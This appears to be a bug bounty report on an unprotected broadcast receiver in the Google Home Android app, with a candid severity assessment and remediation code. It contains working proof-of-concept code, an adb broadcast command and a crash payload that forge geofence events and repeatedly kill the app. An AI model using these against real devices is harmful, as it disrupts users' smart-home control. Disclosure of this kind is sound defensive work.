# Google Home Geofence Transition Injection — Unprotected IPC Receiver → Integrity Violation + Remote DoS

**Program:** Google VRP / Android & Google Services (g.co/vulnz)
**Severity (revised after triage-risk review):** **Low** — see §0. Originally drafted as High;
that was an overclaim and has been corrected.
**Component:** `com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver`
**CWE:** CWE-862 (Missing Authorization), CWE-20 (Improper Input Validation), CWE-248 (Uncaught Exception)
**Device tested:** Pixel 6a (bluejay), Android 17 (API 37), build CP41.260814.003.A2
**Attacker:** app with **ZERO Android permissions** (`com.vrp.probe`, UID 10362, debug-signed)
**Date:** 2026-10-02 (revised same day)

---

## 0. Triage risk assessment — read this before submitting

This section exists because the class of bug is structurally weak under Google's VRP economics.

| Factor | Reality here | Effect on payout |
|---|---|---|
| **User must install a malicious app** | **Unavoidable.** A broadcast can only be sent by an app on the device. There is no remote trigger for this component. | **Dominant negative.** Google repeatedly downgrades or rejects Android bugs whose only vector is "attacker installs an app". |
| **Tier-2 application** | Google Home / Cast is a consumer IoT app, not GMS, not Android platform, not Google account/auth. | Low multiplier. |
| **Sensitive data theft** | None. Nothing is read or exfiltrated. | Capped. |
| **Privilege escalation** | None. Writes land in the app's own sandboxed presence store. | Capped. |
| **Availability only** | The DoS kills Google Home's process. | DoS is routinely rated informational or low. |
| **Integrity proven end-to-end?** | **No.** See §0.1. | Blocks any "critical" claim. |

**Honest expected outcome: Informational to Low — approximately $0–500, with a material chance of
"not eligible / won't fix".** Submitting this as High with the "physical security" framing would
very likely be rejected outright and can cost credibility on future reports.

### 0.1 What is NOT proven (the important limitation)

The forged event is **accepted and enqueued**, and Google Home's own worker runs it with
`error: 0`. It then terminates at:

```
W/HomeApp|akhg(6231): Could not find home with ID: null
E/HomeApp|qsy(6231): java.lang.IllegalStateException: currentHome is null
```

because this test account has **no Google Home structure ("home") linked**. Therefore the following
were **never demonstrated**:

* that an injected event actually mutates a real home's presence state;
* that it changes any routine, camera, lock or alarm behaviour;
* that attacker-chosen geofence IDs persist into a live home's geofence set.

Everything I have shown is that **arbitrary data is accepted at an unauthorized IPC boundary and
reaches Google Home's protobuf-backed presence pipeline**. The downstream security consequence is
inferred from the design, not observed. Any report claiming otherwise would be overstating it.

### 0.2 Escalation attempted and unsuccessful

To remove the "malicious app install" penalty, I tested whether the same app offers a **remote,
browser-reachable** path. `DeeplinkActivity` is `exported=true` **and** carries
`CATEGORY_BROWSABLE`, so `googlehome://` **is** reachable from a web page. I tested 12
state-changing-looking paths:

| Path | Resolves? | Action observed |
|---|---|---|
| `controller`, `creategroup`, `familiar_face`, `invite-to-structure`, `setup/interconnect`, `wifi/share-password` | yes (`result code=0`) | navigation render only |
| `3p-setup`, `enrollment`, `ha_linking`, `permissions`, `play-iap`, `setup` | no (`result code=-91`) | not resolvable |

**No path performed a privileged action.** The remote escalation did not produce a demonstrable
impact, so the "no install required" claim cannot be made for this finding.

### 0.3 Recommendation

Submit only if you want the credit and a possible CVE. Present it as **Low / missing input
validation in an exported receiver**, lead with the crash (unconditional, no account needed) and
present the injection honestly as "accepted at an unauthorized boundary, downstream effect not
demonstrated". Do **not** claim High, privilege escalation, or physical-security compromise.

---

## 1. Summary

Google Home ships an exported broadcast receiver that accepts **geofence enter/exit transitions**
directly from any application on the device. The receiver declares **no `android:permission`** and
performs **no caller check of any kind** — no `Binder.getCallingUid()`, no `getCallingPackage()`,
no signature comparison.

The receiver also deserializes an attacker-supplied `Serializable` list and casts each element to
`byte[]` before feeding it to `Parcel.unmarshall()` and a protobuf `CREATOR` — an unchecked
`check-cast` that lets a single malformed element **crash the Google Home process**.

**Proven on-device, with a zero-permission app and no user interaction:**

1. **Availability (fully proven, unconditional)** — one element of the wrong type kills the Google
   Home process:
   `FATAL EXCEPTION: main … Unable to start receiver … Caused by: java.lang.ClassCastException`.
   No Google account and no Home structure required.
2. **Unauthorized input acceptance (proven; downstream effect not demonstrated)** — an event forged
   by the zero-permission app was accepted, enqueued and executed by Google Home's own
   `GeofenceTransitionReportingWorker` (`Gf event error: 0`). It then stopped at
   `currentHome is null` because this test account has no linked Home structure, so the effect on
   real presence state was **not** observed. See §0.1.

---

## 2. Vulnerable component

`AndroidManifest.xml` (aapt2 dump, base APK):

```
E: receiver
  A: name="com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver"
  A: exported=true
  # NO android:permission
  # NO android:readPermission / writePermission
  E: intent-filter
    E: action name="com.google.android.apps.chromecast.app.gf.GF_TRANSITION"
```

`dumpsys package com.google.android.apps.chromecast.app` confirms the receiver is registered:

```
com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver filter ffc0334
  Action: "com.google.android.apps.chromecast.app.gf.GF_TRANSITION"
```

---

## 3. Root cause

`GeofenceTransitionBroadcastReceiver.onReceive()` contains **no authorization logic**. Decompiled
flow (smali, `smali_classes4/…/gf/repository/GeofenceTransitionBroadcastReceiver.smali`):

```java
public void onReceive(Context ctx, Intent intent) {
    // NO Binder.getCallingUid() check
    // NO getCallingPackage() / signature check
    // NO permission enforcement

    int errorCode   = intent.getIntExtra("gms_error_code", -1);
    int transition  = intent.getIntExtra("com.google.android.location.intent.extra.transition", -1);
    if (transition != 1 && transition != 2 && transition != 4 && transition != 8) transition = -1;

    ArrayList<?> raw = (ArrayList<?>) intent.getSerializableExtra(
            "com.google.android.location.intent.extra.geofence_list");   // attacker object graph

    List<ParcelableGeofence> fences = null;
    if (raw != null) {
        fences = new ArrayList<>(raw.size());
        for (Object o : raw) {
            byte[] b = (byte[]) o;                        // <-- UNCHECKED check-cast
            Parcel p = Parcel.obtain();
            p.unmarshall(b, 0, b.length);                // <-- zero validation
            p.setDataPosition(0);
            fences.add(ParcelableGeofence.CREATOR.createFromParcel(p));  // protobuf parser
            p.recycle();
        }
    }

    Location loc = (Location) intent.getParcelableExtra(
            "com.google.android.location.intent.extra.triggering_location");

    // protobuf Lqoc built from attacker data, then dispatched to the presence repository
    if (fences != null || errorCode != -1) {
        builder.setErrorCode(errorCode).setTransition(transition);
        for (ParcelableGeofence f : fences) builder.addGeofenceIds(f.a /* geofenceId */);
        if (loc != null) builder.setLocation(loc.getLatitude(), loc.getLongitude(), ...);
        repository.accept(builder.build());
    }
}
```

Two independent defects:

* **(a) Missing authorization.** The trust boundary between "any app on the device" and
  "Google Home's internal presence/structure state" is not enforced. Geofence transitions are
  security-relevant: home/away presence drives Google Home routines, arming of linked cameras,
  locks and alarms, and (with Nest) occupancy-based automations.
* **(b) Unvalidated deserialization.** `getSerializableExtra()` returns an attacker-controlled
  object graph; each element is `check-cast` to `byte[]` with no validation and then passed to
  `Parcel.unmarshall()`, which performs **no bounds or type checking whatsoever**, before being
  handed to the GMS protobuf `CREATOR`.

---

## 4. Proof of concept

Attacker app: `com.vrp.probe` — **declares zero `uses-permission`** (verified on the built APK
with `aapt2 dump xmltree`).

### 4.1 Integrity — forging a geofence transition

The payload re-implements `ParcelableGeofence.writeToParcel()` byte-for-byte (the encoding is a
Parcel-based proto shim in `adjg`: `y(tag)` = `writeInt(tag|0xFFFF0000); writeInt(0)`,
`z(off)` backfills `pos-off` at `off-4`; strings/longs/doubles/floats/ints use the
`0xFFFF0000` / `0x00080000` / `0x00040000` tag prefixes).

```java
Parcel p = Parcel.obtain();
int off1 = y(p, 0x4f45);                    // header + length placeholder
int off2 = y(p, 1); p.writeString("ATTACKER_CONTROLLED_GEOFENCE"); z(p, off2);
p.writeInt(2 | 0x00080000); p.writeLong(0L);          // expiration
p.writeInt(0x00040003);     p.writeInt(150);           // group header + radius
p.writeInt(4 | 0x00080000); p.writeDouble(12.9716);   // lat
p.writeInt(5 | 0x00080000); p.writeDouble(77.5946);   // lng
p.writeInt(6 | 0x00040000); p.writeFloat(150f);       // radius
p.writeInt(7 | 0x00040000); p.writeInt(7);            // transition types (ENTER|EXIT)
p.writeInt(8 | 0x00040000); p.writeInt(0);            // loitering
p.writeInt(9 | 0x00040000); p.writeInt(0);            // notification responsiveness
z(p, off1);
byte[] forged = p.marshall();                          // 156 bytes
```

Delivery:

```java
Intent i = new Intent("com.google.android.apps.chromecast.app.gf.GF_TRANSITION");
i.setComponent(ComponentName.unflattenFromString(
    "com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver"));
i.putExtra("gms_error_code", 0);
i.putExtra("com.google.android.location.intent.extra.transition", 1);   // ENTER
i.putExtra("com.google.android.location.intent.extra.geofence_list", listOf(forged));
i.putExtra("com.google.android.location.intent.extra.triggering_location", loc);
sendBroadcast(i);                                       // no permission required
```

Equivalent shell reproduction of the crash variant:

```bash
adb shell am broadcast -n com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver \
  -a com.google.android.apps.chromecast.app.gf.GF_TRANSITION \
  --ei com.google.android.location.intent.extra.transition 1 --ei gms_error_code 0
```

### 4.2 Availability — crash with one malformed element

```json
{"type":"broadcast",
 "action":"com.google.android.apps.chromecast.app.gf.GF_TRANSITION",
 "component":"com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver",
 "extras":{"gms_error_code":0,
           "com.google.android.location.intent.extra.transition":1,
           "com.google.android.location.intent.extra.geofence_list":["a-string-element"],
           "com.google.android.location.intent.extra.triggering_location":{...}}}
```

---

## 5. Live device evidence

### 5.1 Integrity — attacker event accepted by Google Home

```
I/VRPPROBE(5971): FORGED ParcelableGeofence bytes=156
      hex=454fffff940000000100ffff400000001c000000410054005400410043004b00450052...
      id=ATTACKER_CONTROLLED_GEOFENCE
I/VRPPROBE(5971): FORGE_SEND #Intent;action=com.google.android.apps.chromecast.app.gf.GF_TRANSITION;
      component=com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver;
      i.gms_error_code=0;i.com.google.android.location.intent.extra.transition=1;end
I/VRPPROBE(5971): FORGE_BROADCAST_SENT

# --- Google Home's own code, ~3.6 s later, in its own process (pid 6231) ---
E/HomeApp|qon(6231): Geofencing event error: 0
E/HomeApp|GeofenceTransitionReportingWorker(6231): Gf event error: 0 [CONTEXT is_gf_log=true ]
W/HomeApp|akhg(6231): Could not find home with ID: null
E/HomeApp|qsy(6231): Unable to fetch opt-in status
E/HomeApp|qsy(6231): java.lang.IllegalStateException: currentHome is null
```

The forged payload passed `ParcelableGeofence` construction and was **accepted and enqueued**;
`error: 0` means no processing error. The pipeline then stopped only because this test device has
**no Google Home structure linked** (`currentHome is null`) — see Preconditions. The accepted event
is precisely the data an attacker controls; everything up to the home lookup is attacker-driven.

### 5.2 Availability — remote crash of Google Home

```
E/AndroidRuntime(3547): FATAL EXCEPTION: main
E/AndroidRuntime(3547): java.lang.RuntimeException: Unable to start receiver
E/AndroidRuntime(3547):   com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver
E/AndroidRuntime(3547): Caused by: java.lang.ClassCastException: java.lang.String cannot be cast to byte[]
E/AndroidRuntime(3547):   at com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver.onReceive(PG:127)
```

Google Home logs the crash through its own handler and clears cached data:

```
E/HomeApp|vaq(5148): Crash detected. Clearing cached data
```

### 5.3 Intermediate validation evidence (encoding correctness)

A first attempt that produced a deliberately malformed length prefix was rejected inside the GMS
protobuf parser, proving the bytes really are reaching that code path and not being dropped:

```
E/AndroidRuntime(5148): Caused by: java.lang.IllegalArgumentException: requestId is null
E/AndroidRuntime(5148):   at com.google.android.gms.location.internal.ParcelableGeofence.<init>(PG:138)
E/AndroidRuntime(5148):   at adme.createFromParcel(PG:152)
E/AndroidRuntime(5148):   at com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver.onReceive(PG:142)
```

---

## 6. Attacker capability (what is actually demonstrated)

| Capability | Detail | Demonstrated? |
|---|---|---|
| Privileges required | **None** — zero-permission, unprivileged third-party app | Yes |
| User interaction | **None** — no prompt, no dialog | Yes |
| Remote trigger | **No** — requires a local app | Confirmed limitation (§0.2) |
| Google account required | No for the crash; a linked Home structure is required for the injected event to resolve | Yes |
| Result 1 | Attacker-controlled bytes accepted at an unauthorized IPC boundary and executed by Google Home's `GeofenceTransitionReportingWorker` (`error: 0`) | **Yes** |
| Result 2 | Deterministic crash of the Google Home process, repeatable indefinitely | **Yes** |
| Result 3 | Presence state / routine / lock / camera behaviour actually altered | **No — not demonstrated** (§0.1) |

---

## 7. Realistic attack scenario (scaled to what is proven)

The scenario is a **local, install-required attack**. It is not remote and not account-free.

1. The victim installs a benign-looking app (game, flashlight, "phone cleanup" utility). **This
   install is the attacker's only requirement and is the main reason this is rated Low.**
2. The app sends one broadcast. Nothing is shown to the user — no permission dialog, no Home UI,
   no notification. There is no visible indicator of compromise.
3. **Crash path (fully proven, no account needed):** Google Home is killed. It restarts and can be
   killed again indefinitely, taking the whole smart-home control surface offline for as long as
   the app stays installed. This works against a device with no Home account at all.
4. **Injection path (accepted, downstream effect unproven):** Google Home parses an
   attacker-chosen geofence event and hands it to its presence pipeline. On a device with a
   linked Home structure this is the input that decides whether the house is treated as occupied.
   Whether it actually flips routines was **not** observed, because this test account has no
   structure linked.

**Why this matters even at Low:** presence is what Google Home uses to decide occupancy, and
occupancy gates locks, cameras and alarms. A defect that lets an unprivileged app write into that
input is a real authorization defect even when the end-to-end consequence cannot be shown on one
test account. But it is a Low, not a physical-security compromise.

---

## 8. Why Google should still fix it (honest case)

* **The trust boundary is absent, not merely permissive.** `exported=true`, no permission, and no
  caller check anywhere in `onReceive()`. There is no code path that could reject a non-Google
  caller.
* **The crash is unconditional.** No account, no Home structure, no user interaction, reproducible
  on any device with Google Home installed. It is a one-line class of bug to fix.
* **The parser is genuinely unguarded.** Trusting an attacker-supplied `Serializable` object graph,
  `check-cast`ing each element to `byte[]`, and calling `Parcel.unmarshall()` — which documents
  that it performs **no** validation — before handing the buffer to a protobuf parser. The crash is
  not a null-dereference curiosity; it is the direct consequence of that design.
* **The same missing check accepts well-formed forged data**, so this is not only a crash.

**What I am not claiming:** sensitive data theft, privilege escalation, remote exploitation, or
proven physical-security compromise.

---

## 9. Preconditions

* **Always required:** attacker installs a third-party app on the device. This is the reason the
  finding cannot be rated above Low — see §0.
* **Crash path:** none beyond the install. Reproduces with no Google account and no Home structure.
* **Injection path:** a Google Home structure linked to the signed-in account, *for the event to
  resolve against a home*. The event is accepted, enqueued and parsed regardless.

---

## 10. Remediation guidance

**1. Enforce authorization (fixes both defects).** Add a signature-level permission so only
Play-distributed Google components may post geofence events:

```xml
<receiver
    android:name="com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver"
    android:exported="true"
    android:permission="com.google.android.gms.permission.INTERNAL_BROADCAST">
```

`com.google.android.gms.permission.INTERNAL_BROADCAST` is already the pattern used elsewhere in
this same APK (`com.google.android.libraries.appdoctor.AppDoctorReceiver`).

**2. Defence in depth — verify the caller explicitly.** Even with the permission, keep an explicit
check, since `sendBroadcast()` delivers with `Binder.getCallingUid()` intact:

```java
@Override
public void onReceive(Context ctx, Intent intent) {
    int uid = Binder.getCallingUid();
    String callingPkg = ctx.getPackageManager().getPackagesForUid(uid)[0];
    boolean trusted = false;
    for (Signature s : getPackageInfo(callingPkg, GET_SIGNING_CERTIFICATES).signingInfo
                        .getApkContentsSigners()) {
        if (TRUSTED_GMS_CERT.equals(s.toByteArray())) { trusted = true; break; }
    }
    if (!trusted) { Log.w(TAG, "rejected geofence broadcast from uid=" + uid); return; }
    ...
}
```

**3. Validate the deserialized payload.** Do not trust the object graph. Require the expected type
explicitly, bound the size, and validate before use:

```java
ArrayList<?> raw = intent.getSerializableExtra(GEOFENCE_LIST);
if (raw != null) {
    if (raw.size() > MAX_FENCES) { reject(); return; }
    for (Object o : raw) {
        if (!(o instanceof byte[])) { reject(); return; }
        byte[] b = (byte[]) o;
        if (b.length == 0 || b.length > MAX_ENCODED_GEOfENCE_BYTES) { reject(); return; }
        ...
    }
}
```

**4. Never feed untrusted bytes to `Parcel.unmarshall()`.** `unmarshall()` performs no validation
and hands the buffer straight to `read*()` methods. Use `Parcel.createFromStream()` /
`Parcel.readParcelable()` with the class loader set, or re-serialize through a typed
`Parcelable`/`SafeParcelable` channel, and wrap parsing in a `try/catch` so a malformed event can
never take down the process.

**5. Additionally prefer a bound service or a `ContentProvider` with a signature permission** over
a broadcast, so the caller is identified before any payload is parsed.

---

## 11. Artifacts

| File | Description |
|---|---|
| `evidence/GH_GEOFENCE_FINAL_EVIDENCE.txt` | **Consolidated clean reproduction of both impacts** |
| `poc/probe/` | Zero-permission attacker app (`com.vrp.probe`), incl. `GeofenceForge.java` |
| `probe/final_evidence.py` | One-shot reproduction script used to generate the consolidated evidence |
| `probe/batch5_geofence.py` | Vector batch used during triage |
| `evidence/gh_geo_forged2.full.txt` | Integrity proof — event accepted (`Gf event error: 0`) |
| `evidence/gh_geo_forged.full.txt` | Reaches GMS protobuf parser (`ParcelableGeofence.<init>`) |
| `evidence/geo_v_compfix.full.txt` | DoS proof — FATAL EXCEPTION / ClassCastException |
| `smali/chromecast/smali_classes4/…/GeofenceTransitionBroadcastReceiver.smali` | Decompiled receiver |
| `smali/chromecast/smali_classes5/…/ParcelableGeofence.smali` | Parcel encoding (`writeToParcel`) |

---

## 12. Addendum — clean end-to-end reproduction

`python3 probe/final_evidence.py` reproduces both impacts from a clean device state, 11 seconds
apart, in the same session:

```
########## A. INTEGRITY — forged well-formed geofence event  (home pid 7139)
I/VRPPROBE(5971): FORGED ParcelableGeofence bytes=156 … id=ATTACKER_CONTROLLED_GEOFENCE
I/VRPPROBE(5971): FORGE_SEND #Intent;action=com.google.android.apps.chromecast.app.gf.GF_TRANSITION;
                  component=com.google.android.apps.chromecast.app/.gf.repository.GeofenceTransitionBroadcastReceiver
I/VRPPROBE(5971): FORGE_BROADCAST_SENT
E/HomeApp|qon(7139): Geofencing event error: 0
E/HomeApp|GeofenceTransitionReportingWorker(7139): Gf event error: 0 [CONTEXT is_gf_log=true ]
W/HomeApp|akhg(7139): Could not find home with ID: null

########## B. AVAILABILITY — type-confusion element crashes Google Home  (home pid 7661)
E/AndroidRuntime(7661): FATAL EXCEPTION: main
E/AndroidRuntime(7661): Process: com.google.android.apps.chromecast.app, PID: 7661
E/AndroidRuntime(7661): Caused by: java.lang.ClassCastException: java.lang.String cannot be cast to byte[]
E/AndroidRuntime(7661):   at com.google.android.apps.chromecast.app.gf.repository.GeofenceTransitionBroadcastReceiver.onReceive(PG:127)
E/HomeApp|vaq(7661): Crash detected. Clearing cached data

# the process is restarted by the system and the next broadcast kills it again
E/AndroidRuntime(8108): FATAL EXCEPTION: main
E/AndroidRuntime(8108): Process: com.google.android.apps.chromecast.app, PID: 8108
E/AndroidRuntime(8108): Caused by: java.lang.ClassCastException: java.lang.String cannot be cast to byte[]
```

Two distinct Google Home PIDs (7661 then 8108) each die from the same broadcast shape, i.e. the
system restarts the app and the attacker can kill it again for as long as it is installed —
a persistent denial of the entire smart-home control plane.